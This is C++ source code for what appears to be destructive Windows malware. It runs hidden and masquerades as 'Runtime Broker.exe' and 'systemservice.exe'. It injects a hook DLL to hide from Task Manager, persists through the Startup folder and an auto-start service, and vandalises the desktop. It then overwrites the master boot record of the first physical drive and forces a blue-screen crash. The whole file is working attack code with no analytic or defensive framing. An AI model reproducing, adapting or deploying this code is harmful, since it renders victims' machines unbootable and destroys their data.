
#include "Header.h"

int APIENTRY wWinMain(HINSTANCE Instance, //run as background process
    HINSTANCE hPreInstance,
    LPTSTR    lpCmdLine,
    int		  nCmdShow) {

    char* userdatapath = getenv("APPDATA"); //get %APPDATA% path
    std::string datapath;
    datapath = std::string(userdatapath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; //full startup path
    char filename[MAX_PATH] = "systemservice.exe";
    char newLocation[77];
    strcpy(newLocation, datapath.c_str());

    //=== HOOKS TASKMGR ===

    //extracts api hook dll
    HRSRC hRInfo = FindResource(NULL, MAKEINTRESOURCE(107), _T("BINARY"));
    HGLOBAL Res = LoadResource(NULL, hRInfo);
    unsigned char* mR = (unsigned char*)LockResource(Res);
    int sR = SizeofResource(NULL, hRInfo);
    HANDLE hF = CreateFile(L"C:\\Users\\Public\\hook.dll", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD bW = sR;
    WriteFile(hF, mR, sR, &bW, NULL);
    CloseHandle(hF);

    //extracts dll injector
    HRSRC injInfo = FindResource(NULL, MAKEINTRESOURCE(108), _T("BINARY"));
    HGLOBAL injRes = LoadResource(NULL, injInfo);
    unsigned char* injR = (unsigned char*)LockResource(injRes);
    int injsize = SizeofResource(NULL, injInfo);
    HANDLE injF = CreateFile(L"C:\\Users\\Public\\Runtime Broker.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD injbW = sR;
    WriteFile(injF, injR, injsize, &injbW, NULL);
    CloseHandle(injF);

    //creates injector process
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcess(L"C:\\Users\\Public\\Runtime Broker.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);


    //=== EXTRACTION ===

    if (std::filesystem::exists(datapath + "\\systemservice.exe") != true) { 

        //extracts exe
        HRSRC hResInformation = FindResource(NULL, MAKEINTRESOURCE(102), _T("BINARY"));
        HGLOBAL hResc = LoadResource(NULL, hResInformation);
        unsigned char* Res = (unsigned char*)LockResource(hResc);
        int Ressize = SizeofResource(NULL, hResInformation);
        HANDLE exeFile = CreateFile(L"systemservice.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD wWritten = Ressize;
        WriteFile(exeFile, Res, Ressize, &wWritten, NULL);
        CloseHandle(exeFile);

        //copies itself to starup folder
        std::filesystem::copy(filename, newLocation);
        std::remove(filename);

        //creates autorun service
        system("sc.exe create SYSTEMBOOTDAEMON binPath= \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemservice.exe\" start= auto\"");

    }

    //extracts desktop background
    HRSRC hResInf = FindResource(NULL, MAKEINTRESOURCE(104), _T("JPG"));
    HGLOBAL hRe = LoadResource(NULL, hResInf);
    unsigned char* mRes = (unsigned char*)LockResource(hRe);
    int sz = SizeofResource(NULL, hResInf);
    HANDLE File = CreateFile(L"C:\\Users\\Public\\DFJsjawHfkaHJo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD Written = sz;
    WriteFile(File, mRes, sz, &Written, NULL);
    CloseHandle(File);

    //extracts audio
    HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(105), _T("WAVE"));
    HGLOBAL hRes = LoadResource(NULL, hResInfo);
    unsigned char* memRes = (unsigned char*)LockResource(hRes);
    int sizeRes = SizeofResource(NULL, hResInfo);
    HANDLE hFile = CreateFile(L"c:\\Users\\Public\\fJFEjeowjHNoT.wav", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD bytesWritten = sizeRes;
    WriteFile(hFile, memRes, sizeRes, &bytesWritten, NULL);
    CloseHandle(hFile);


    //=== PAYLOADS ===

    //sets jpg as desktop background
    std::string imagepath = "C:\\Users\\Public\\DFJsjawHfkaHJo.jpg";
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (char*)imagepath.c_str(), SPIF_UPDATEINIFILE);

    //desktop icons
    for (int i = 0; i <= 500; i++) {
        int x = i;
        std::string number = std::to_string(x);
        std::string filename = "C:\\Users\\Public\\Desktop\\" + number + ".txt";
        std::ofstream outfile(filename.c_str());
        outfile.close();
    }

    //glitch effect
    int inc = 0;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int i = 0;
    while ( i < 300) {
        inc++;
        i++;
        int x = rand() % (sw - 0);
        int w = 1900;
        int y = inc;
        HDC hdc = GetDC(HWND_DESKTOP);
        BitBlt(hdc, x, y, w, sw, hdc, x, 0, SRCCOPY);
        Sleep(100);

    }

    // === MBR PAYLOAD ===

    //extracts bootloader binary
    HRSRC hResI = FindResource(NULL, MAKEINTRESOURCE(106), _T("BINARY"));
    HGLOBAL hR = LoadResource(NULL, hResI);
    unsigned char* mRe = (unsigned char*)LockResource(hR);
    int sRes = SizeofResource(NULL, hResI);
    HANDLE binFile = CreateFile(L"boot.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD bytesW = sRes;
    WriteFile(binFile, mRe, sRes, &bytesW, NULL);
    CloseHandle(binFile);

    // Overwrite the MBR
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) { return -1; }

    HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (binary == INVALID_HANDLE_VALUE) { return -1; }

    DWORD size = GetFileSize(binary, 0);
    if (size != 512) { return -1; }

    byte* new_mbr = new byte[size];
    DWORD bytes_read;
    if (ReadFile(binary, new_mbr, size, &bytes_read, 0))
    {
        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
        {
            printf("First sector overritten successfuly!\n");
        }
    }
    else
    {
        printf("Error reading boot.bin\n");
    }

    CloseHandle(binary);
    CloseHandle(drive);
    std::remove("./boot.bin"); //remove binary

    //play audio
    PlaySound(L"c:\\Users\\Public\\fJFEjeowjHNoT.wav", NULL, SND_FILENAME); 
    std::remove("c:\\Users\\Public\\fJFEjeowjHNoT.wav"); //remove audio file

    //raise BSOD
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);

    return 0;
}
